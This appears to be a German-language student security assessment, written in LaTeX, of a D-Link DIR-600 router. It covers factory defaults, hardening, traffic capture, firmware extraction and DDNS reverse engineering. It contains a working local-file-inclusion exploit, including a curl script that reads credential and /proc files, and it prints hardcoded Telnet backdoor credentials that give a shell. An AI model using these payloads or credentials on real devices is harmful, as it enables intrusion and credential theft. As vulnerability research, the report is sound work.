+	\section{Architektur des Routers}
+	\label{sec:Architektur des Routers}
+	Der betrachtete Router ist von der Firma D-Link und gehört zu der DIR-600 Reihe.
+	Die Hardware Version ist Bx, wobei x für 1 oder 2 steht.
+
+	\begin{figure}[H]
+		\centering
+		\includegraphics[width=\textwidth]{img/Aufbau_Router.pdf}
+		\caption{Aufbau des Routers}
+		\label{fig:Aufbau Router}
+	\end{figure}
+	
+	Der Router folgt einer klassischen Embedded-System-Architektur mit klar getrennten Schichten.
+	Nach dem Start wird der Bootloader geladen. Er ist dafür zuständig die Hardware zu initialisieren, 
+	und den Linux Kernel aus dem Flash zu laden, welcher die Hardware abstrahiert.
+	Der Linux Kernel übernimmt die Prozessverwaltung, den Netzwerk-Stack und
+	die Treibersteuerung. Das Root-Filesystem enthält
+	eine minimalistische Userspace-Umgebung auf Basis von Busybox. 
+	Die Konfigurationsdatenbank (xmldb) ist das zentrale Element der Firmware, auf das mit dem Tool
+	xmldbc zugegriffen wird. Dort werden in der sämtliche Systemparameter gespeichert und über Skripte dynamisch in
+	konkrete Systemkonfigurationen umgesetzt. Die Steuerung erfolgt über ein Webinterface, das mit PHP-Skripten
+	mit der Konfigurationsschicht interagiert. Netzwerkdienste wie DHCP, NAT und WLAN werden durch eine
+	Kombination aus Kernel-Modus und Userspace-Daemons realisiert.
+
+	Der Router nutzt iptables für Routing und NAT, hostapd für WLAN und stellt einen integrierten Webserver
+	mit HTTP und PHP zum Management bereit. Netzwerkdienste wie DHCP, DNS und PPP werden über spezialisierte Daemons und
+	Skripte gesteuert. \cite{hostapdieee80211ab, netfilteriptablesprojectb, dlinksupportresourcesb}
+
+	\section{Analyse des Routers}
+	\label{sec:Analyse des Routers}
+
+	\subsection{Werkseinstellungen}
+	\label{sec:Werkseinstellungen}
+	Vor Beginn der Tests wurde der Router auf die Werkeinstellungen mithilfe des Reset-Knopfs zurückgesetzt.
+	Im Folgenden wird beschrieben welche Einstellungen der Router von Werk aus hat, und was dies für
+	die Sicherheit des Routers bedeutet.
+	
+	Im Werkszustand ist das Gerät so konfiguriert, dass eine einfache Inbetriebnahme ermöglicht wird.
+	Hierbei werden Sicherheitsaspekte nur rudimentär berücksichtigt. 
+	Die Administrationsoberfläche ist über die standardisierte lokale IP-Adresse 192.168.0.1 erreichbar.
+	Für den Zugriff auf die Weboberfläche sind Standard Zugangsdaten hinterlegt, welche sowohl auf dem Router
+	selbst als auch in der Bedienungsanleitung und im Internet offen hinterlegt sind.
+	Falls das Passwort nach dem ersten Login nicht geändert wird, stellt dies ein erhebliches Sicherheitsrisiko dar,
+	da ein Angreifer leicht Zugriff zu der Oberfläche bekommt. Der Nutzer wird nicht dazu aufgefordert sein Passwort
+	zu ändern und es gibt keine Beschränkung bei der Wahl des Passworts, es können also auch kurze oder einfältige
+	Passwörter gewählt werden, die durch eine Brute Force Attack leicht zu komprimieren sind.
+
+	Auch die Netzwerkkonfiguration ist im Auslieferungszustand sehr offen gestaltet. Der Router vergibt 
+	Standardmäßig Adressen mit DHCP im privaten Adressbereich und stellt grundlegende Routing-Funktionalitäten zwischen
+	lokalem Netz und Internet bereit. Besonders kritisch sind die Standardkonfiguration des WLAN-Bereichs. In der ursprünglichen Konfiguration ist
+	die Verschlüssel ausgestellt. Zumindest wird auf der Seite darauf hingewiesen, dass diese Einstellung nicht
+	empfohlen wird. Unautorisierter Zugriff auf das Netzwerk wird nicht unterbunden, das bedeutet jedes Gerät
+	in Reichweite des Netzwerks kann sich mit diesem Verbinden.MAC-Adressenfilterung, Firewall-Regelungen und Zugriffsbeschränkungen
+	sind deaktiviert oder nicht konfiguriert.
+	Dadurch wird die Netzwerkinfrastruktur im Auslieferungszustand offen gehalten, dies erleichtert die 
+	Inbetriebnahme des Gerätes für den Nutzer.
+
+	Die Kommunikation mit dem Webinterface erfolgt standardmäßig unverschlüsselt über HTTP, 
+	Daten können potenziell ausgelesen und mitgeschnitten werden.
+
+	Insgesamt zeigt die Analyse der Werkeinstellungen, dass der Router primär auf einfache Inbetriebnahme
+	und Kompatibilität ausgelegt ist, während Sicherheitsmechanismen nur minimal vorhanden sind.
+	Ohne nachträgliche Konfiguration entsteht dadurch ein Angriffsvektor sowohl auf Netzwerk- als auch auf
+	Administrationsebene.
+
+	\subsection{Gehärteter Router}
+	\label{sec:Gehärteter Router}
+	Nach der initialen Analyse der Werkseinstellungen wurde der Router durch gezielte Sicherheitskonfigurationen gehärtet, 
+	um unautorisierten Zugriff zu verhindern und die Angriffsfläche zu reduzieren.
+
+	Zunächst wurden die WLAN-Sicherheit auf WPA/WPA2 mit AES Verschlüsselung und PSK
+	eingestellt und ein Passwort gesetzt. Dies hat zur Folge, dass eine Authentifizierung
+	nötig ist bevor ein Gerät Zugriff auf das Netzwerk erhält.
+	Dadurch werden unkontrollierte Zugriffe auf das WLAN erschwert. Aktive und passive Angriffe auf das 
+	LAN werden minimiert.
+	\begin{figure}[H]
+		\centering
+		\includegraphics[width=\textwidth]{img/WPA_WPA2.png}
+		\caption{WPA/WPA2 Einstellugen}
+		\label{fig:http}
+	\end{figure}
+	Zusätzlich wurde die Standard-IP-Adressen des Routers im lokalen Netzwerk angepasst. Diese Maßnahme dient weniger
+	der eigentlichen Sicherheit, sondern reduziert automatisierte Standardangriffe, auf die Administrationsoberfläche.
+	\begin{figure}[H]
+		\centering
+		\includegraphics[width=\textwidth]{img/IP-Adresse ändern.png}
+		\caption{IP-Adresse ändern}
+		\label{fig:http}
+	\end{figure}	
+
+	Eine weitere Schutzmaßnahme stellt die MAC-Adressfilterung dar.
+	Dabei wird eine Liste mit MAC-Adressen im Router hinterlegt. Nur Geräte, deren MAC-Adresse, mit der
+	Liste übereinstimmen erlangen Zugriff auf das Netzwerk. In der Praxis ist diese Methode jedoch nur
+	bedingt zuverlässig, da sich MAC-Adressen fälschen lassen. Zudem können moderne Betriebssysteme 
+	MAC-Adressen an ein Gerät zufällig vergeben, wodurch die Verwaltung unpraktisch werden kann.
+
+	Ergänzend wurden Firewall Regelungen betrachtet, mit denen der Zugriff auf bestimmte IP-Adressen 
+	und Dienste gesteuert werden kann. Datenverkehr zwischen Netzwerken kann gezielt gesteuert und unerwünschte
+	Verbindungen blockiert werden.
+	\begin{figure}[H]
+		\centering
+		\includegraphics[width=\textwidth]{img/Firewall_Test.png}
+		\caption{Firewall}
+		\label{fig:http}
+	\end{figure}	
+
+	Des weiteren unterstützt der Router statisches Routing und Port Forwarding.
+	Diese Funktionen ermöglichen die gezielte Weiterleitung von Netzwerkverkehr an interne Geräte und
+	werden typischerweise für spezielle Dienste oder Serveranwendungen genutzt.
+	Allerdings stellen sie bei Fehlkonfiguration ein Sicherheitsrisiko dar, da interne Systeme nach außen
+	exponiert werden.
+
+	Der Router bietet außerdem die Möglichkeit Remote Administration zu aktivieren. Diese Funktion ermöglicht
+	Zugriff auf die Administrationsoberfläche von außerhalb des Netzwerks über die öffentliche IP-Adresse.
+	Standardmäßig ist dieser Zugriff sehr offen konfiguriert (alle IP-Adressen 0.0.0.0), wodurch 
+	die Oberfläche im Grunde weltweit erreichbar ist. Aus diesem Grund sollte Remote Administration entweder
+	deaktiviert oder auf eine definierte IP-Adresse beschränkt werden.
+	\begin{figure}[H]
+		\centering
+		\includegraphics[width=\textwidth]{img/administration.png}
+		\caption{Remote Administration}
+		\label{fig:http}
+	\end{figure}	
+
+	HTTPS-Unterstützung für die Verwaltungsoberfläche ist bei diesem Modell/Firmwarestand nicht verfügbar, 
+	wodurch die Kommunikation mit der Weboberfläche unverschlüsselt erfolgt und somit potenziell mitgelesen 
+	oder manipuliert werden kann, selbst wenn der Router gehärtet wurde.
+	
+	\subsection{Analyse des Netzwerkverkehrs}
+	\label{sec:Analyse des Netzwerkverkehrs}
+
+	Der Router ist mit dem Laptop über ein LAN-Kabel mit Port 1 verbunden. Der Router ist mit dem Internet verbunden.
+	Zum Mitschnitt des Netzwerkverkehrs wurde das Tool Wireshark verwendet.
+	Mit dem Filter \texttt{dns} lassen sich lediglich die Pakete anzeigen die an den DNS-Server gesendet werden.
+	Der klassische DNS-Server nutzt UDP (Port 53) und verschlüsselt seine Inhalte nicht.
+	Die besuchten Domänen und Hintergrundinformationen sind voll einsehbar.
+
+	\begin{figure}[H]
+		\centering
+		\includegraphics[width=\textwidth]{img/http_login_dlink.png}
+		\caption{Wireshark Filter: http}
+		\label{fig:http}
+	\end{figure}
+	Der Router nutzt HTTP, das bedeutet die Pakete werden unverschlüsselt übertragen.
+	Beim Login auf die Admin-Seite des Routers http://192.168.0.1 sind die Benutzer und Passwort
+	im Klartext einsehbar. Auch das Ändern des Passworts und das Einstellen anderer
+	Konfigurationen konnte im Netzwerkmitschnitt beobachtet werden.
+	Die Web-Oberfläche inklusive der UI, Statusseite und den Konfigurationen wird über HTTP geladen.
+	Ohne Transportverschlüsselung können Daten und Session-Inhalte passiv oder aktiv durch Man-in-the-Middle-Angriffe
+	mitgeschnitten oder manipuliert werden.
+
+\begin{figure}[H]
+	\centering
+	\includegraphics[width=\textwidth]{img/Passwort_telnet.png}
+	\caption{Wireshark Filter: telnet}
+	\label{fig:Telnet Passwort}
+\end{figure}
+	Auch die Verbindung über das Telnet Protokoll wird unverschlüsselt übertragen.
+	Die Authentifizierungsdaten sind klar nachvollziehbar und können leicht rekonstruiert werden. 
+	Telnet arbeitet zeichenbasiert, daher wird jedes Zeichen als eigenes Paket oder Teil eines Streams geschickt.
+	Sitzungen können vollständig rekonstruiert werden.
+
+	Das Address-Resolution-Protocol (ARP) ist ein Netzwerkprotokoll, welches zu einer Netzwerkadresse die 
+	physische Adresse ermittelt und diese Zuordnung in der ARP-Tabelle gegebenenfalls hinterlegt.
+	ARP ist ein Layer 2 Protokoll und bietet keine Authentifizierung. Angriffe wie MAC-Spoofing oder 
+	ARP-Spoofing sind möglich. 
+
+	Dieselben Mitschnitte wurden über das WLAN ebenfalls untersucht, es wurden keine prägnanten Unterschiede festgestellt.
+
+	Die Analyse zeigt, dass mehrere zentrale Dienste ohne kryptografische Absicherung betrieben werden. Dies macht
+	Angriffe auf das Netzwerk möglich, wodurch Authentifizierungsdaten kompromittiert werden können.
+
+	\section{Firmware-Analyse}
+	\label{sec:Firmware-Analyse}
+	Zur Analyse der Firmware wurde das Tool \texttt{binwalk} eingesetzt:
+
+	\begin{lstlisting}[basicstyle=\ttfamily,
+		columns=fullflexible,
+    	keepspaces=true,
+    	breaklines=true
+		]
+	binwalk DIR600B_FW205b01.bin 
+	
+	DECIMAL     HEXADECIMAL  	DESCRIPTION
+	------------------------------------------------------------
+	48          0x30        	Unix path: /dev/mtdblock/2
+	96          0x60           	uImage header, header size: 64 bytes,
+								image size: 879555 bytes,
+								Data Address: 0x80000000,
+								Entry Point: 0x802B7000,
+								OS: Linux, CPU: MIPS,
+								compression type: lzma
+	160         0xA0           	LZMA compressed data
+	917600      0xE0060        	Squashfs filesystem
+	\end{lstlisting}
+	
+	Der uImage Header enthält unter anderem Informationen zur CPU (MIPS), zur Ladeadresse im RAM sowie zum Einstiegspunkt
+	des Kernels. Das verwendete Linux-System basiert auf einem Kernel der Version 2.6.x, was auf ein
+	veraltetes System hindeutet.
+
+	\begin{table}[h]
+		\centering
+		\hypertarget{tabelle1}{}
+			\begin{tabularx}{\columnwidth}{|X|X|}
+			\hline
+			header size: 64 bytes & beschreibt den Kernel \newline enthält CRCs, Entry Point \\
+			\hline
+			image size: 879555 bytes & Größe des Kernel-Images \\
+			\hline
+			Data Address: 0x80000000 & RAM-Adresse, wo Kernel geladen wird \\
+			\hline
+			Entry Point: 0x802B7000 & Startadresse der Kernel-Ausführung \\
+			\hline
+			OS: Linux, CPU: MIPS & Zielarchitektur MIPS \\
+			\hline
+			compression: lzma & Kernel ist komprimiert, spart Flash-Speicher \\
+			\hline
+			\end{tabularx}
+		\caption{Inside The uImage}
+	\end{table}
+	
+	In LZMA compressed data steht der eigentliche Kernel Code, komprimiert mit LZMA.
+	Dictionary size: 32MB bestimmt das Kompressionsfenster und ist typisch für Embedded Linux Kernel.
+	uncompressed size 2.9MB ist die reale Kernelgröße nach dem Entpacken.
+
+	PackImg section delimiter tag Das ist ein Marker für den Beginn einer weiteren Firmware-Sektion. 
+
+	SquashFS ist ein komprimiertes, schreibgeschütztes Linux Dateisystem der version 3.0.
+	Durch Ausführen von:
+	\begin{lstlisting}[basicstyle=\ttfamily]
+		binwalk -e DIR600B_FW205b01.bin 
+	\end{lstlisting}
+	wurde die Firmwear extrahiert und das Dateisystem zugänglich gemacht. \cite{squashfs40filesystemab}
+	
+	\section{Schwachstellen-Analyse}
+	\subsection{LFI-Schwachstelle}
+	\label{sec:LFI-Schwachstelle}
+
+	Im Rahmen der Firmware-Analyse wurde im Verzeichniss \texttt{squashfs-root/www/} 
+	die Implementierung des Webinterface untersucht. Dabei konnte in der Datei \newline
+	\texttt{squashfs-root/www/model/\_\_show\_info.php} eine sicherheitsrelevante Schwachstelle
+	identifiziert werden.
+	Die Datei fungiert als generischer Content-Renderer für das Webinterface. 
+	Sie ermöglicht unter anderem das dynamische Einbinden von Dateien.
+	Der relevante Codeabschnitt lautet:
+\begin{lstlisting}[language=PHP]
+if($REQUIRE_FILE!="")
+{
+	require($LOCALE_PATH."/".$REQUIRE_FILE);
+}
+\end{lstlisting}
+
+	Hierbei wird der Parameter \texttt{REQUIRE\_FILE} ohne Validierung in einen Dateipfad eingebunden
+	und anschließend mittels \texttt{require()} eingebunden. Da dieser Parameter direkt durch den
+	Benutzer kontrolliert werden kann, entsteht eine Local File Inclusion (LFI)-Schwachstelle.
+	Durch das Verwenden von Directory Traversal Sequenzen, also der unautorisierte Zugriff auf Dateien 
+	mittels Pfadangaben in der URL, können unter anderem sensible Daten eingesehen werden.
+	Beispielsweise folgende Anfrage: \newline
+	\texttt{/www/locale/en\_US/ + ../../../../var/etc/httpasswd}. \newline
+	PHP löst das dann zu /var/etc/httpasswd auf, die Datei wird eingebunden und der Inhalt auf der Webseite sichtbar.
+	\begin{figure}[H]
+		\centering
+		\includegraphics[width=\textwidth]{img/Passwort.png}
+		\caption{Seite nach Exploit}
+		\label{fig: Hallo}
+	\end{figure}
+
+	Auswirkung
+	Die Datei /var/etc/httpasswd enthält für den aktuellen Benutzernamen und das Passwort,
+	welche wiederum oft nur schwach gehasht oder wie in diesem Fall im Klartext in der Datei gespeichert wird.
+	Dies ermöglicht die Umgehung der Authentifizierung.
+
+	Automatisierte Analyse
+	Ein automatisiertes Testskript wurde verwendet, um verschiedene Dateisysteme abzurufen.
+\begin{lstlisting}[language=bash]
+#!/bin/bash
+
+if [ $# -ne 1 ]; then
+	echo " Error: No IP-Adress"
+	exit
+fi
+
+IP_ADR=$1
+
+FILES=(
+	"/var/etc/httpasswd"
+	"/var/log/messages"
+	"/proc/self/cmdline"
+	"/proc/self/environ"
+	"/proc/mounts"
+	"/proc/version"
+	"/proc/cpuinfo"
+	"/etc/hosts"
+)
+
+test_file() {
+echo "------------------------------------"
+echo "Test: $1"
+echo "------------------------------------"
+local encode
+encode=$(printf "%s" "$1" | jq -sRr @uri)
+
+curl -s "http://${IP_ADR}/model/__show_info.php?REQUIRE_FILE=${encode}" \
+	-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \
+	-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
+	-H 'Accept-Language: en-US,en;q=0.5' \
+	-H 'Accept-Encoding: gzip, deflate' \
+	-H 'Connection: keep-alive' \
+	-H 'Upgrade-Insecure-Requests: 1' \
+	-H 'Priority: u=0, i' \
+| sed -e 's/<!--.*-->//g' \
+		-e 's/<[^>]*>//g' \
+		-e 's/&nbsp;//g' \
+		-e '/^\s*$/d'
+}
+
+for file in "${FILES[@]}"; do
+test_file "$file"
+done
+
+exit
+\end{lstlisting}
+	Das Skript arbeitet die einzelnen Pfade nacheinander ab. Der Befehl curl überträgt Daten zwischen dem Rechner
+	und einem Server. Mit -H lassen sich HTTP-Header setzen. Zudem wurde das Paket $jq$ installiert, so kann die Eingabe automatisch
+	entsprechend der URL-Vorgaben formatiert werden. \cite{pathtraversalowaspb, reschke2015b, wstgstableowaspb, wstgstableowaspa}
+
+	\begin{itemize}
+	\item \texttt{/var/etc/httpasswd} – enthält Zugangsdaten für das Webinterface
+	\item \texttt{/var/log/messages} – enthält Logdaten und Netzwerkaktivität
+	\item \texttt{/proc/self/cmdline} – enthält informationen zur CommandLine des Prozesses
+	\item \texttt{/proc/self/environ} – zeigt Umgebungsvariablen des Prozesses 
+	\item \texttt{/proc/mounts} –zeigt Mountpoints und die Filesystem-Struktur
+	\item \texttt{/proc/version} – liefert Kernel-Informationen
+	\item \texttt{/proc/cpuinfo} – enthält Informationen zur Hardwarearchitektur
+	\item \texttt{/etc/hosts} – enthält den Hostnamen und die interne Struktur
+	\end{itemize}
+
+	\subsection{Bewertung:}
+	\label{sec:lfi}
+
+	\begin{itemize}
+		\item \textbf{Attack Vector (AV):} Network
+		\item \textbf{Attack Complexity (AC):} Low
+		\item \textbf{Privileges Required (PR):} None
+		\item \textbf{User Interaction (UI):} None
+	\end{itemize}
+
+	\textbf{Auswirkungen:}
+	\begin{itemize}
+		\item \textbf{Confidentiality (C):} High
+		\item \textbf{Integrity (I):} Low
+		\item \textbf{Availability (A):} Low
+	\end{itemize}
+
+
+	Router wurde zurückgesetzt, durch langes Drücken des Resetknopfs.
+	Nutzer und Passwort wurden zurückgesetzt.
+	Nutzer: admin
+	Passwort: (blank)
+	Einloggen hat geklappt, Zugriff auf die Adminseite.
+
+
+	\textbf{Voraussetzungen:}  
+	Zugriff auf das Webinterface des Routers (LAN/WLAN).
+
+	\textbf{Gesamtbewertung:}  
+	High, durch das Extrahieren der Authentifizierungsdaten sind weitere Angriffe auf den Router möglich.
+
+	\textbf{Begründung:}  
+	Die Schwachstelle erlaubt das Auslesen sensibler Systemdateien ohne
+	Authentifizierung, was zu einem hohen Verlust an Vertraulichkeit führt.
+	Die Ausnutzung ist trivial und erfordert keine besonderen Bedingungen.
+
+	\subsection{Telnet}
+	Im Rahmen der Analyse wurde überprüft, ob der Router eine Telnet-Schnittstelle für Remote-Zugriffe bereitstellt.
+	Teletype Network (Telnet) ist ein Client/Server basiertes Protokoll (Port 23).
+	Der Austausch erfolgt über eine TCP Verbindung. Bei Routern dient Telnet als Remote-Management-Protokoll
+	und gibt dem Benutzer eine Kommandozeile auf dem Gerät.
+	Mit folgendem Befehl ist es möglich herauszufinden ob der Router eine Telnet Schnittstelle besitzt.
+\begin{lstlisting}[basicstyle=\ttfamily]
+nc -zv 192.168.0.1 23
+Connection to 192.168.0.1 23 port [tcp/telnet] succeeded!
+\end{lstlisting}
+	
+	Der D-Link DIR 600 besitzt eine Telnet-Schnittstelle, welche durch einen Nutzer und ein Passwort
+	geschützt sind. Unter einem Embedded Linux ist der Standardnutzer in diesem Fall \texttt{Alphanetworks}.
+	Dies lässt sich durch eine kurze Recherche über das Internet herausfinden. Das Standardpasswort des Routers unterscheidet sich
+	nach Modell. Um das Passwort der Telnet-Schnittstelle herauszufinden, wurden die Firmware des Routers
+	erneut analysiert.
+	\texttt{grep -r "Alphanetworks"}
+\begin{lstlisting}[basicstyle=\ttfamily]
+squashfs-root/etc/scripts/misc/telnetd\.sh: \
+telnetd -l "/usr/sbin/login" -u Alphanetworks:\$image\_sign -i \$lf &}
+\end{lstlisting}
+	Mit dem grep Befehl wurde die Firmware nach dem Standardnutzer rekursiv durchsucht.
+	Das Ergebnis zeigt den Benutzer und das Passwort, welches in \texttt{\$image\_sign} gespeichert wird.
+	\texttt{grep -r "image\_sign" squashfs-root/}
+\begin{lstlisting}
+squashfs-root/etc/scripts/misc/telnetd\.sh:
+image\_sign=`cat /etc/config/image\_sign`
+\end{lstlisting}
+	Die Ausgabe zeigt unter anderem diese Zeile, welche den Pfad zu dem Passwort enthält.
+	\texttt{cat squashfs-root/etc/config/image\_sign}
+	\texttt{wrgn23\_dlwbr\_dir600b}
+Der \texttt{cat-Befehl} liefert das Passwort.
+\begin{lstlisting}[basicstyle=\ttfamily]
+Trying 192.168.0.1...
+Connected to 192.168.0.1.
+Escape character is '^]'.
+login: Alphanetworks
+Password: wrgn23\_dlwbr\_dir600b
+\end{lstlisting}
+	Eine erfolgreiche Anmeldung bestätigt die Gültigkeit dieser Zugangsdaten.
+	
+	Nach erfolgreicher Anmeldung erhält der Benutzer Zugriff auf eine Shell-Umgebung, die durch \texttt{Busybox}, 
+	bereitstellt wird. BusyBox ist eine Sammlung von Unix-Werkzeugen, die unter anderem eine Shell bereitstellen. 
+	Der Befehl \texttt{mount} zeigt folgendes:
+\begin{lstlisting}[basicstyle=\ttfamily]
+/dev/root on / type squashfs (ro)
+none on /proc type proc (rw)
+sysfs on /sys type sysfs (rw)
+ramfs on /var type ramfs (rw)
+\end{lstlisting}
+	Durch die Ausgabe wird deutlich, das es sich um eine Read-Only-Firmware mit einem Eingebetteten Linux Design handelt.
+	Lediglich der RAM ist beschreibbar, jedoch sind die Daten dort nur während der Laufzeit verfügbar und verschwinden nach einem Reboot.
+	Dort werden typischerweise Logs, temporäre Dateien und Runtime-Konfigurationen gespeichert.
+	/proc enthält Prozess- und Systeminformationen und /sys Kernelparameter und die Hardwareabstraktion.
+	Hier können Parameter gesetzt aber das System nicht persistent geändert werden.
+	
+	Der Benutzer und das Passwort für die Telnet-Verbindung sind hardkodiert und im System eingebettet. Sie können nicht geändert werden.
+	Auch wenn auf dem System Daten nicht persistent geändert werden können, stellt die Telnet-Schnittstelle ein
+	Risiko dar. Ein Angreifer könnte durch den Befehl \texttt{reboot} eine sofortige Unterbrechung des Netzwerks
+	auslösen. Da Schreibrechte auf dem /var Verzeichnis existieren könnten dort viele und große Dateien erzeugt werden, um so den 
+	Speicher zu füllen und die Dienste zu destabilisieren. Dies könnte den Router verlangsamen oder zu einem 
+	reboot führen. Außerdem kann der Angreifer durch Befehle wie ping, msh, kill oder busybox Prozesse mehrfach starten und die CPU dauerhaft belasten.
+	Des Weiteren können Routerkonfigurationen, die interne Netzstruktur, DNS und Gateway sowie die aktiven Clients
+	eingesehen werden, was die Informationsgewinnung erleichtert. \cite{nvdcve202642375ab,telnetprotocolspecificationb}
+
+	\subsection{Bewertung:}
+	\label{sec:Bewertung-Telnet}
+
+	\begin{itemize}
+		\item \textbf{Attack Vector (AV):} Network
+		\item \textbf{Attack Complexity (AC):} Low
+		\item \textbf{Privileges Required (PR):} Low
+		\item \textbf{User Interaction (UI):} None
+	\end{itemize}
+
+	\textbf{Auswirkungen:}
+	\begin{itemize}
+		\item \textbf{Confidentiality (C):} High
+		\item \textbf{Integrity (I):} High
+		\item \textbf{Availability (A):} High
+	\end{itemize}
+
+	\textbf{Voraussetzungen:}  
+	Zugriff über Telnet (LAN/WLAN), ermitteln des Passworts.
+
+	\textbf{Gesamtbewertung:}  
+	High, es sind weitere Angriffe über die Telnet-Verbindung möglich.
+
+	\textbf{Begründung:}  
+	Die Schwachstelle erlaubt den Zugriff auf eine Remote Shell.
+	Sensible Daten könne ausgelesen werden und Befehle ausgeführt werden.
+	Die Ausnutzung ist trivial und erfordert keine besonderen Bedingungen. 
+
+	\subsection{Analyse des DDNS-Systems}
+	Die Analyse des DDNS-Subsystems dient dazu, potenzielle sicherheitskritische Datenflüsse zwischen
+	Konfigurationsdatenbank, Skripten und Netzwerkkommunikation zu identifizieren.
+	Im Fokus steht die Rekonstruktion der Programmstruktur mittels Reverse Engineering %nochmal erklräen
+	sowie eine anschließende Bewertung.
+
+	Die Firmware des D-Link DIR-600 Routers zeigt eine typische Architektur für eingebettete Linux-Systeme.
+	Konfigurationsdaten werden über den Dienst \texttt{xmldbc} verwaltet, eine XML-Datenbank.
+	Das Dynamic Domain Name System auch DDNS genannt, ist hier nicht als externe Bibliothek implementiert, sondern als separates Binärprogramm.
+	Die DDNS-Funktionalität wird über dynamisch generierte Shell-Skripte gestartet.
+\begin{lstlisting}[language=PHP]
+# dyndns.sh
+rgdb -A $TROOT/misc/dyndns_run.php -V generate_start=$START > /var/run/dyndns.sh
+sh /var/run/dyndns.sh > /dev/console
+\end{lstlisting}
+	Die eigentliche Logik wird dabei durch ein PHP-Template dynamisch, also während der Laufzeit erzeugt.
+	Dieses Template entscheidet aufgrund von Konfigurationswerten aus der Router-Datenbank, ob und welcher DDNS-Client
+	gestartet wird.
+	
+	Die eigentliche Befehlslogik wird dabei dynamisch erzeugt:
+\begin{lstlisting}[language=PHP]
+if ($USER!="" && $PASS!="")
+{
+	echo "echo Start dyndns #".$provider."... > /dev/console\n";
+	echo "echo dyndns > ".$progfile."\n";
+	echo "dyndns -S \"".$provider;
+	echo "\" -u \"".$USER."\" -p \"".$PASS."\" -i ".$IPADDR." -t ".$TIME;
+	echo " -o /var/run/dyndns.html -d \"".$vendor." ".$model."\"";
+	echo " -q \"/var/run/dyndns.info\"";
+	if ($HOST!="") { echo " -n \"".$HOST."\""; }
+	echo " > /dev/console &\n";
+}
+\end{lstlisting}
+	Hierbei wird zur Laufzeit ein Systembefehl generiert und ausgeführt.
+	Es zeigt sich, dass sämtliche Parameter, einschließlich Benutzername, Passwort, Hostname und IP-Adresse,
+	direkt aus der Konfigurationsdatenbank übernommen werden. Eine zusätzliche Validierung
+	dieser Eingabe findet nicht statt. Dies stellt einen kritischen Punkt dar, da es sich dabei
+	um potenziell manipulierte Daten handelt könnte.
+
+	Die Analyse des Binärprogramms \texttt{/usr/bin/dyndns} wurde mithilfe von Ghidra genauer analysiert 
+	Es zeigt, dass die Kommandozeilenargumente direkt verarbeitet werden:
+\begin{lstlisting}[language=c]
+case 0x6e:  // -n
+	pcRam1000027c = optarg;   // hostname
+case 0x70:  // -p
+	DAT_10000288 = optarg;    // password
+case 0x69:  // -i
+	DAT_10000280 = optarg;    // IP address
+case 0x53: // -S
+	DAT_10000274 = atoi(optarg);  // provider ID
+\end{lstlisting}
+	
+	Anschließend wird anhand einer Service-ID entschieden, welcher DDNS-Anbieter
+	verwendet wird. Hierfür wird eine interne Tabelle verwendet, welche Service-Namen numerische Identifikation zuordnet.
+	Falls die Parameter ungültig oder unvollständig führt dies zum Programm Abbruch.
+
+	Nach der Konfigurationsphase folgt die Netzwerklogik.
+	Das Programm arbeitet mit zustandsbasierter Logik über \texttt{select()}:
+\begin{lstlisting}[language=c]
+iVar2 = select(uVar7 + 1,
+		(fd_set *)local_288,
+		(fd_set *)__writefds,
+		(fd_set *)0x0,
+		&local_290);
+\end{lstlisting}
+	Interpretation der Zustände:
+	0 = disconnected
+	1 = connecting
+	2 = connected/update running
+	Abhängig vom aktuellen Zustand werden zyklisch Netzwerkverbindungen aufgebaut, geprüft oder erneuert. 
+	Dabei werden klassische BSD-Socket-Funktioenen wie \texttt{socket()} und \texttt{connect()},
+	um eine Verbindung zu den jeweiligen DDNS-Servern herzustellen.
+	
+	Die Auswahl des DDNS-Anbieters bestimmt dabei den Aufbau der HTTP-Anfrage. 
+	Die Firmware unterstützt mehrere Anbieter beispielsweise DynDNS, No-IP, wobei jeder Anbieter ein spezifisches Anfrageformat verwendet. 
+	Beispiel DynDNS.org
+\begin{lstlisting}[language=c]
+snprintf(acStack_260,500,
+	"GET /nic/update?&hostname=%s&ip=%s HTTP/1.0\r\n
+		Authorization: Basic %s\r\n
+		User-Agent: %s\r\n
+		Host: %s\r\n\r\n",
+		uRam1000027c,puVar2,uVar1,DAT_10000294,DAT_10000278);
+\end{lstlisting}
+	Die HTTP-Requests werden manuell zusammengesetzt und direkt über eine Socket-Verbindung versendet.
+	Zusätzlich wird in den meisten Fällen eine Basis-Authentifizierung, bestehend aus Benutzername und Passwort
+	verlangt, welche Base64 codiert in den HTTP-Header integriert werden (siehe oben).
+	\texttt{base64encode(pcVar4,sVar3,&uStack\_28)}
+
+	Die Implementierung weist einige sicherheitskritische Schwächen auf, die für ältere Embedded-Systeme typisch sind.
+	Insbesondere der Verzicht auf eine verschlüsselte Kommunikation stellt ein potenzielles Risiko dar. 
+	Sämtliche DDNS-Anfragen erfolgen über eine ungesicherte HTTP-Verbindung, wodurch Zugangsdaten im Klartext über das Netzwerk übertragen werden können.
+	Dadurch besteht ein erhebliches Risiko für Man-in-the-Middle Attacken sowie das Abgreifen von Zugangsdaten.
+
+	Zudem werden sensible Daten im Speicher verarbeitet. Authentifizierungsinformationen werden global abgelegt und mehrfach
+	in unterschiedlichen Verarbeitungsschritten verwendet. Auch wenn keine direkten Schwachstellen im 
+	untersuchten Codeabschnitt sichtbar sind, bleibt durch die unsauberen Datenflüsse und die 
+	fehlende strikte Validierung ein erhöhtes Sicherheitsrisiko. \cite{thomas2021b}
+
+	\subsection{Bewertung:}
+	\label{sec:Bewertung-DDNS}
+
+	\begin{itemize}
+		\item \textbf{Attack Vector (AV):} Network
+		\item \textbf{Attack Complexity (AC):} Low
+		\item \textbf{Privileges Required (PR):} None
+		\item \textbf{User Interaction (UI):} None
+	\end{itemize}
+
+	\textbf{Auswirkungen:}
+	\begin{itemize}
+		\item \textbf{Confidentiality (C):} High
+		\item \textbf{Integrity (I):} Low
+		\item \textbf{Availability (A):} Low
+	\end{itemize}
+
+	\textbf{Voraussetzungen:}  
+	Zugriff auf das Netzwerk (LAN).
+
+	\textbf{Gesamtbewertung:}  S
+	High, es ist möglich, den Netzwerkverkehr zu verfolgen (Man-in-the-Middle Attack)
+
+	\textbf{Begründung:}  
+	Die DDNS-Kommunikation erfolgt unverschlüsselt über HTTP, wodurch Authentifizierungsdaten
+	im Klartext übertragen werden. Ein Angreifer kann diese durch einen Netzwerk-Mitschnitt
+	abfangen und für weiter Angriffe verwenden.
